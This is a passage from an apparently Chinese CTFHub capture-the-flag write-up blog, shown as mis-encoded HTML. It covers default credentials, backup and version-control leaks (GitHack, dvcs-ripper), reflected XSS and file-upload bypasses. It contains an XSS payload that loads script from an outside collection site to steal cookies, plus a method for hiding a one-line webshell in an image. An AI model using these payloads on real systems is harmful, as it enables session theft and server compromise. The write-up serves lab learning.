class="keyword">admin</span></span><br><span class="line">æ¢­å­é±¼é‚®ä»¶å­˜å‚¨ç½‘å…³    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br></pre></td></tr></table></figure><h2 id="2-ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#2-ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="2.ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>2.ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220919213733369.png" alt="image-20220919213733369"></p><h2 id="2-1-ä¿¡æ¯æ³„éœ²-robots-txt"><a href="#2-1-ä¿¡æ¯æ³„éœ²-robots-txt" class="headerlink" title="2.1 ä¿¡æ¯æ³„éœ²-robots.txt"></a>2.1 ä¿¡æ¯æ³„éœ²-robots.txt</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®url/robots.txt</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹çˆ¬è™«åè®®</p><h2 id="2-2-ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶"><a href="#2-2-ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶" class="headerlink" title="2.2 ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶"></a>2.2 ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®url/æ–‡ä»¶å.åç¼€å<span class="string">.bak</span></span><br></pre></td></tr></table></figure><p>ä¸‹è½½bakï¼ˆå¤‡ä»½æ–‡ä»¶ï¼‰</p><h2 id="2-3-ä¿¡æ¯æ³„éœ²-vimç¼“å­˜"><a href="#2-3-ä¿¡æ¯æ³„éœ²-vimç¼“å­˜" class="headerlink" title="2.3 ä¿¡æ¯æ³„éœ²-vimç¼“å­˜"></a>2.3 ä¿¡æ¯æ³„éœ²-vimç¼“å­˜</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨ä½¿ç”¨<code>vim</code>æ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­<code>vim</code>æ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“<code>vim</code>å¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹</p><p>ä»¥ <code>index.php</code> ä¸ºä¾‹ï¼š<br><strong>ç¬¬ä¸€æ¬¡</strong>äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º <code>.index.php.swp</code></p><p><strong>å†æ¬¡æ„å¤–é€€å‡º</strong>åï¼Œå°†ä¼šäº§ç”Ÿåä¸º <code>.index.php.swo</code> çš„äº¤æ¢æ–‡ä»¶</p><p><strong>ç¬¬ä¸‰æ¬¡äº§ç”Ÿ</strong>çš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º <code>.index.php.swn</code><br>ä½œç”¨</p><p><u>å¯ç”¨æ¥æ¢å¤æ„å¤–é€€å‡ºçš„æ–‡ä»¶</u></p><h3 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h3><p><code>SWP</code>æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ï¼Œæ“ä½œæ—¶éœ€è¦åœ¨æ–‡ä»¶åå‰åŠ .</p><p>é’ˆå¯¹<code>SWP</code>å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>vim -r filename</code>å‘½ä»¤æ¥æ¢å¤æ–‡ä»¶<br>(<code>vim</code>ä½¿ç”¨çš„ç¼“å­˜å­˜å‚¨ä¸ºä¸€ç§å›ºå®šæ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è€Œæˆ‘ä»¬ä¸€èˆ¬ç¼–è¾‘çš„æ—¶æ˜é—®å¯è§å­—ç¬¦ï¼Œåœ¨vimçš„ç¼“å­˜ä¸­è¿™äº›å¯è§å­—ç¬¦ä¼šåŸæ ·ä¿ç•™,æ‰€ä»¥æ˜¾ç¤ºæ˜¯ä¸€ç§ä¹±ç )<br>æ ¹æ®æç¤ºæŒ‰å›è½¦è¿›è¡Œæ¢å¤</p><h2 id="2-4-ä¿¡æ¯æ³„éœ²-DS-Store"><a href="#2-4-ä¿¡æ¯æ³„éœ²-DS-Store" class="headerlink" title="2.4 ä¿¡æ¯æ³„éœ²-.DS_Store"></a>2.4 ä¿¡æ¯æ³„éœ²-.DS_Store</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.DS_Store</span> æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡<span class="string">.DS_Store</span>å¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®url/.DS_Store</span><br></pre></td></tr></table></figure><p>ä¸‹è½½<code>DS_Store</code>æ–‡ä»¶</p><h2 id="3-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log"><a href="#3-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log" class="headerlink" title="3.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log"></a>3.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log</h2><p> ç¬¬ä¸€æ¬¡ä½¿ç”¨<strong>githack</strong>ï¼Œè®°å½•ä¸€ä¸‹</p><p><strong>æ³¨æ„githackéœ€è¦python2.7ç‰ˆæœ¬</strong></p><p><code>å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚</code></p><p><code>GitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨æµ‹è¯•è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚</code></p><h3 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h3><p>1ã€è§£æ<code>.git/index</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„ï¼š ( æ–‡ä»¶åï¼Œæ–‡ä»¶sha1 )<br>2ã€å»<code>.git/objects/</code> æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶<br>3ã€<code>zlib</code>è§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç </p><h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><p>é€Ÿåº¦å¿«ï¼Œé»˜è®¤20ä¸ªå·¥ä½œçº¿ç¨‹<br>å°½é‡è¿˜åŸæ‰€æœ‰çš„æºä»£ç ï¼Œç¼ºå¤±çš„æ–‡ä»¶ä¸å½±å“è„šæœ¬å·¥ä½œ<br>è„šæœ¬ä¸éœ€è¦æ‰§è¡Œé¢å¤–çš„gitå‘½ä»¤ï¼Œ<code>all you need is python</code><br>è„šæœ¬æ— éœ€æµè§ˆç›®å½•</p><h3 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h3><p>æ³¨æ„è¿™é‡Œåœ¨urlåé¢éœ€è¦åŠ ä¸Š.gitï¼Œç”¨dirsearchå¯ä»¥æ‰«å‡ºæ¥ï¼ˆpython3ï¼‰</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http:<span class="regexp">//</span>www.openssl.org<span class="regexp">/.git/</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç›®å½•<code>dist</code>å°±ä¼šç”Ÿæˆå¯¹åº”ç›®å½• </p><p>æ‰“å¼€ç›®å½•ï¼Œè¾“å…¥<code>cmd</code>ï¼Œæ‰§è¡Œ<code>git log</code>ã€<code>git log</code> å¯ä»¥æŸ¥çœ‹<code>commit history</code>ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œçš„å†å²ï¼Œå¯ä»¥çœ‹çœ‹ä¹‹å‰æ‰§è¡Œè¿‡å“ªäº›å‘½ä»¤ï¼Œæ–¹ä¾¿åé¢æŸ¥è¯¢å‘½ä»¤æ‰§è¡Œçš„å…·ä½“å†…å®¹ã€‘</p><p><img src="/2022/07/27/CTFHub-wp/image-20220728230330073.png" alt="image-20220728230330073"></p><p>ç„¶åå¤åˆ¶<code>add flag</code>è¿™ä¸ªå‘½ä»¤çš„ä»£ç ï¼Œå¦‚ä¸Šå›¾<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p><p>ç„¶åç”¨<code>git diff</code></p><p>ã€</p><p>git diffæ¯”è¾ƒä¸¤ä¸ªç‰ˆæœ¬çš„å·®å¼‚ï¼Œ</p><p>è¿™é‡Œåé¢åªæœ‰<strong>ä¸€ä¸ªå‘½ä»¤</strong>å°±æ˜¯æ¯”è¾ƒæœ¬åœ°å·¥ä½œåŒºå’Œç¼“å­˜åŒºçš„ä¿¡æ¯åŒºåˆ«</p><p>å¦‚æœåé¢æœ‰<strong>ä¸¤ä¸ªå‘½ä»¤</strong>ï¼Œå°±æ˜¯æ¯”è¾ƒè¿™ä¸¤ä¸ªå‘½ä»¤çš„å·®åˆ«</p><p>ã€‘</p><p><img src="/2022/07/27/CTFHub-wp/image-20220728231134513.png" alt="image-20220728231134513"></p><p>è¿™é‡Œæ¯”è¾ƒï¼Œå°±å¾—åˆ°äº†<code>flag</code></p><h2 id="4-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash"><a href="#4-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash" class="headerlink" title="4.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash"></a>4.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash</h2><h3 id="git-stash-çš„ä½œç”¨"><a href="#git-stash-çš„ä½œç”¨" class="headerlink" title="git stash çš„ä½œç”¨"></a>git stash çš„ä½œç”¨</h3><p>git stashç”¨äºæƒ³è¦ä¿å­˜å½“å‰çš„ä¿®æ”¹,ä½†æ˜¯æƒ³å›åˆ°ä¹‹å‰æœ€åä¸€æ¬¡æäº¤çš„å¹²å‡€çš„å·¥ä½œä»“åº“æ—¶è¿›è¡Œçš„æ“ä½œ.git stashå°†æœ¬åœ°çš„ä¿®æ”¹ä¿å­˜èµ·æ¥,å¹¶ä¸”å°†å½“å‰ä»£ç åˆ‡æ¢åˆ°HEADæäº¤ä¸Š.</p><p>é€šè¿‡git stashå­˜å‚¨çš„ä¿®æ”¹åˆ—è¡¨,å¯ä»¥é€šè¿‡<u><strong>git stash list</strong></u>æŸ¥çœ‹.<u><strong>git stash show</strong></u>ç”¨äºæ ¡éªŒ,<u><strong>git stash apply</strong></u>ç”¨äºé‡æ–°å­˜å‚¨.ç›´æ¥æ‰§è¡Œ<u><code>git stash</code>ç­‰åŒäº<code>git stash save.</code></u></p><p>æœ€æ–°çš„å­˜å‚¨ä¿å­˜åœ¨<code>refs/stash</code>ä¸­è€çš„å­˜å‚¨å¯ä»¥é€šè¿‡ç›¸å…³çš„å‚æ•°è·å¾—,ä¾‹å¦‚<code>stash@&#123;0&#125;</code>è·å–æœ€æ–°çš„å­˜å‚¨,stash@{1}è·å–æ¬¡æ–°<code>.stash@&#123;2.hour.ago&#125;</code>è·å–ä¸¤å°æ—¶ä¹‹å‰çš„.å­˜å‚¨å¯ä»¥ç›´æ¥é€šè¿‡ç´¢å¼•çš„ä½ç½®æ¥è·å¾—<code>stash@&#123;n&#125;</code>.</p><p>æ“ä½œåŒ<code>2.log</code></p><p>å¯ä»¥å…ˆç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹ï¼Œ å‘ç°<code>refs/stash</code>æ–‡ä»¶ï¼Œ</p><p>ç„¶åç”¨<code>GitHack</code>æ‰«æ</p><p>åœ¨ç”Ÿæˆæ–‡ä»¶å¤¹é‡Œæœ‰<code>stash</code>æ–‡ä»¶</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs`</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/CTFHub-wp/image-20220729115457869.png" alt="image-20220729115457869"></p><p>æ‰“å¼€çœ‹åˆ°</p><p><img src="/2022/07/27/CTFHub-wp/image-20220729115528299.png" alt="image-20220729115528299"></p><p>åœ¨ç”Ÿæˆçš„æ–‡ä»¶å¤¹ä¸‹ç”¨</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff d8c1978b1e71300574e1bb5335a01<span class="number">124b3a55569</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>flag</code></p><p>ã€ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>git bash</code>ï¼Œç›´æ¥åœ¨ç”Ÿæˆçš„æ–‡ä»¶å¤¹ä¸‹</p><p>æ‰§è¡Œ<code>git stash list</code> </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹stashäº†å“ªäº›å­˜å‚¨</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œ<code>git stash pop</code></p><pre><code>æ¢å¤ä¹‹å‰ç¼“å­˜çš„å·¥ä½œç›®å½•ï¼Œå°†ç¼“å­˜å †æ ˆä¸­çš„å¯¹åº”stashåˆ é™¤ï¼Œå¹¶å°†å¯¹åº”ä¿®æ”¹åº”ç”¨åˆ°å½“å‰çš„å·¥ä½œç›®å½•ä¸‹,é»˜è®¤ä¸ºç¬¬ä¸€ä¸ªstash,å³stash@&#123;0&#125;ï¼Œå¦‚æœè¦åº”ç”¨å¹¶åˆ é™¤å…¶ä»–stashï¼Œå‘½ä»¤ï¼šgit stash pop stash@&#123;$num&#125; ï¼Œæ¯”å¦‚åº”ç”¨å¹¶åˆ é™¤ç¬¬äºŒä¸ªï¼šgit stash pop stash@&#123;1&#125;ï¼‰</code></pre><p>ç„¶åä¼šåœ¨è¯¥ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–°çš„<code>txt</code>æ–‡ä»¶ï¼Œæ‰“å¼€æˆ–ç”¨<code>cat</code>å‘½ä»¤ï¼Œå¾—åˆ°<code>flag</code></p><p>ã€‘</p><h2 id="5-ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²"><a href="#5-ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²" class="headerlink" title="5.ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²"></a>5.ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²</h2><p><code>å½“å¼€å‘äººå‘˜ä½¿ç”¨ SVN è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚</code></p><p>è¿™é“é¢˜éœ€è¦è¿ç”¨<code>dvcs-ripper</code>å·¥å…·è¿›è¡Œå¤„ç†</p><p>å¯ä»¥å…ˆç”¨<code>dirsearch</code>æ‰«å‡º<code>.svn</code>ç›®å½•ï¼Œè¯´æ˜æœ‰<code>SVN</code>æ³„éœ²</p><p>å’Œ<code>githack</code>ç±»ä¼¼ï¼Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/rip-svn.pl -v -u url/</span>.svn</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨dvcs-ripperç›®å½•é‡Œï¼Œè¿›å…¥.svnç›®å½•</p><p><img src="/2022/07/27/CTFHub-wp/image-20220729175208298.png" alt="image-20220729175208298"></p><p>ç„¶åè¿›å…¥pristineç›®å½•ï¼Œè¿›å»å‘ç°ä¸¤ä¸ªç›®å½•ï¼ŒæŒ¨ä¸ªæ‰“å¼€</p><p><img src="/2022/07/27/CTFHub-wp/image-20220729175252045.png" alt="image-20220729175252045"></p><p><img src="/2022/07/27/CTFHub-wp/image-20220729175429878.png" alt="image-20220729175429878"></p><p>å‘ç°ä¸€ä¸ªç›®å½•ä¸‹æ˜¯ç½‘ç«™é¡µé¢æºç ï¼Œå¦ä¸€ä¸ªå°±æ˜¯<code>flag</code></p><p>å¾—åˆ°<code>flag</code></p><h2 id="6-ä¿¡æ¯æ³„éœ²-HGæ³„éœ²"><a href="#6-ä¿¡æ¯æ³„éœ²-HGæ³„éœ²" class="headerlink" title="6.ä¿¡æ¯æ³„éœ²-HGæ³„éœ²"></a>6.ä¿¡æ¯æ³„éœ²-HGæ³„éœ²</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`å½“å¼€å‘äººå‘˜ä½¿ç”¨ Mercurial è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚`</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å…ˆç”¨<code>dirsearch</code>æ‰«å‡º<code>.hg</code>ç›®å½•ï¼Œè¯´æ˜æœ‰<code>HG</code>æ³„éœ²</p><p>è¿™ä¸ªå’Œ<code>SVN</code>ä¸€æ ·ï¼Œåªä¸è¿‡è¦æ”¹æˆ<code>.hg</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/rip-hg.pl -v -u url/</span>.hg</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/CTFHub-wp/image-20220730164340016.png" alt="image-20220730164340016"></p><p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼ŒçŒœæµ‹ä¸º<code>HG</code>æ³„éœ²æ–‡ä»¶</p><p><img src="/2022/07/27/CTFHub-wp/image-20220730164428184.png" alt="image-20220730164428184"></p><p>å‘ç°<code>flag</code>æ–‡æœ¬æ–‡ä»¶</p><p><img src="/2022/07/27/CTFHub-wp/image-20220730164949862.png" alt="image-20220730164949862"></p><p><code>url+flag_973127138.txt</code></p><p>å¾—åˆ°<code>flag</code></p><h2 id="7-xss-xssåå°„å‹"><a href="#7-xss-xssåå°„å‹" class="headerlink" title="7.xss-xssåå°„å‹"></a>7.xss-xssåå°„å‹</h2><p>å‘ç°å®ƒæœ‰ä¸¤ä¸ªè¾“å…¥æ¡†</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731104635854.png" alt="image-20220731104635854"></p><p>ç¬¬ä¸€ä¸ªè¾“å…¥æµ‹è¯•è¯­å¥ï¼ŒæˆåŠŸå¼¹çª—</p><p>ç¬¬äºŒä¸ªæ˜¯å‘é€<code>url</code>ï¼Œç›²çŒœæ˜¯å‘åˆ°åå°</p><p>çœ‹äº†ä¸€äº›<code>wp</code>ï¼Œå‘ç°éœ€è¦ä½¿ç”¨<code>xss</code>æµ‹è¯•å¹³å°<code>http://xsscom.com//index.php</code></p><p>å…ˆåˆ›å»ºé¡¹ç›®</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731113619175.png" alt="image-20220731113619175"></p><p>è®¾ç½®é…ç½®</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731113753893.png" alt="image-20220731113753893"></p><p>ç„¶åç‚¹å‡»æŸ¥çœ‹ä»£ç </p><p><img src="/2022/07/27/CTFHub-wp/image-20220731113810045.png" alt="image-20220731113810045"></p><p>åœ¨æœ€ä¸‹é¢çœ‹åˆ°</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731113837566.png" alt="image-20220731113837566"></p><p>æŠŠä»£ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xsscom.com//9VJcMV</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å…¥åˆ°ç¬¬ä¸€ä¸ªæ¡†ä¸­</p><p>å†æŠŠæäº¤åçš„urlå¤åˆ¶ï¼Œç„¶ååˆ°ç¬¬äºŒæ¡†ä¸­å‘é€</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731114028909.png" alt="image-20220731114028909"></p><p>ç„¶åè¿”å›xssæµ‹è¯•å¹³å°ä¸ŠæŸ¥çœ‹</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731114142138.png" alt="image-20220731114142138"></p><p><code>cookie</code>å¤„å‡ºç°<code>flag</code></p><h2 id="8-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥"><a href="#8-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥" class="headerlink" title="8.æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥"></a>8.æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥</h2><p><code>æ–‡ä»¶å¤´æ˜¯ç›´æ¥ä½äºæ–‡ä»¶ä¸­çš„ä¸€æ®µæ•°æ®,æ˜¯æ–‡ä»¶çš„ä¸€éƒ¨åˆ†</code></p><p>è¿™é‡Œè¿‡æ»¤æ–‡ä»¶å¤´ï¼Œè€Œä¸”é™åˆ¶å›¾ç‰‡ç±»å‹æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•ä¸Šä¼ ä¸€ä¸ªæ²¡æœ‰ä»»ä½•é—®é¢˜çš„å›¾ç‰‡ã€æ³¨æ„å›¾ç‰‡ä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶ä¼šæœ€åç”¨èšå‰‘è¿æ¥ä¼šçˆ†é”™ï¼Œæˆ‘ä¸Šä¼ 1mbå¤§å°å›¾ç‰‡å°±æŠ¥é”™ï¼Œæœ€åä¸Šä¼ 400å­—èŠ‚å›¾ç‰‡æ‰æˆåŠŸã€‘</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731164210465.png" alt="image-20220731164210465"></p><p>ä¸Šä¼ å›¾ç‰‡åï¼Œåœ¨åé¢åŠ ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶å</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ã€ä¹Ÿå¯ä»¥ç”¨<span class="keyword">cmd</span><span class="language-bash"> åˆæˆå›¾ç‰‡é©¬ï¼Œä¹Ÿæ˜¯æœ‰å›¾ç‰‡æ–‡ä»¶å¤´ã€‘</span></span><br><span class="line"></span><br><span class="line">ã€<span class="keyword">copy</span><span class="language-bash"> å›¾ç‰‡å.png(.jpg)/b + æœ¨é©¬æ–‡ä»¶å.php(.asp/.aspx)/a ç”Ÿæˆå›¾ç‰‡å.png(.jpg)ã€‘</span></span><br><span class="line"></span><br><span class="line">ã€å·²è¯•å¯è¡Œã€‘</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/CTFHub-wp/image-20220731164732820.png" alt="image-20220731164732820"></p><p>ç„¶åæ­£å¸¸ç”¨èšå‰‘è¿æ¥</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731164330254.png" alt="image-20220731164330254"></p><p>å¾—åˆ°<code>flag</code></p><h2 id="9-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­"><a href="#9-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­" class="headerlink" title="9.æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­"></a>9.æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­</h2><h3 id="0x00æˆªæ–­åŸç†ï¼š-php-lt-5-3-29"><a href="#0x00æˆªæ–­åŸç†ï¼š-php-lt-5-3-29" class="headerlink" title="0x00æˆªæ–­åŸç†ï¼š[php&lt;5.3.29]"></a>0x00æˆªæ–­åŸç†ï¼š[php&lt;5.3.29]</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x00æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºæ–¹æ³•ï¼Œæ˜¯<span class="keyword">ascii</span>ç ä¸º<span class="number">0</span>çš„å­—ç¬¦ï¼Œåœ¨æœ‰äº›å‡½æ•°å¤„ç†æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“åšç»“æŸç¬¦ã€‚ç³»ç»Ÿåœ¨å¯¹æ–‡ä»¶åçš„è¯»å–æ—¶ï¼Œå¦‚æœé‡åˆ°<span class="number">0</span>x00ï¼Œå°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸã€‚è¿™ä¸ªå¯ä»¥ç”¨åœ¨å¯¹æ–‡ä»¶ç±»å‹åçš„ç»•è¿‡ä¸Šã€‚</span><br><span class="line"></span><br><span class="line">ä½†è¦æ³¨æ„æ˜¯æ–‡ä»¶çš„<span class="number">16</span>è¿›åˆ¶å†…å®¹é‡Œçš„<span class="number">00</span>ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åä¸­çš„<span class="number">00</span> ï¼ï¼ï¼å°±æ˜¯è¯´ç³»ç»Ÿæ˜¯æŒ‰<span class="number">16</span>è¿›åˆ¶è¯»å–æ–‡ä»¶ï¼ˆæˆ–è€…è¯´äºŒè¿›åˆ¶ï¼‰ï¼Œ</span><br><span class="line"></span><br><span class="line">é‡åˆ°<span class="keyword">ascii</span>ç ä¸ºé›¶çš„ä½ç½®å°±åœæ­¢ï¼Œè€Œè¿™ä¸ª<span class="keyword">ascii</span>ç ä¸ºé›¶çš„ä½ç½®åœ¨<span class="number">16</span>è¿›åˆ¶ä¸­æ˜¯<span class="number">00</span>ï¼Œç”¨<span class="number">0</span><span class="keyword">x</span>å¼€å¤´è¡¨ç¤º<span class="number">16</span>è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯æ‰€è¯´çš„<span class="number">0</span>x00æˆªæ–­ã€‚</span><br><span class="line"></span><br><span class="line">%<span class="number">00</span>æ˜¯è¢«æœåŠ¡å™¨è§£ç ä¸º<span class="number">0</span>x00å‘æŒ¥äº†æˆªæ–­ä½œç”¨ã€‚</span><br></pre></td></tr></table></figure><p><code>ä¸¾ä¸ªä¾‹å­ï¼Œurlä¸­è¾“å…¥çš„æ˜¯upload/post.php%00.pngï¼Œçœ‹æ ·å­æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œé‚£ä¹ˆåå°è¯»å–åˆ°æ˜¯upload/post.phpï¼Œå°±å®ç°äº†ç»•åç›®çš„ã€‚</code></p><p>æˆ‘ä»¬å¼€å§‹å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶è¯•è¯•ï¼Œé™åˆ¶<code>jpg,png,gif</code>åç¼€</p><p>ä¸Šä¼ æˆåŠŸåï¼Œæ²¡æœ‰æ˜¾ç¤ºä¸Šä¼ 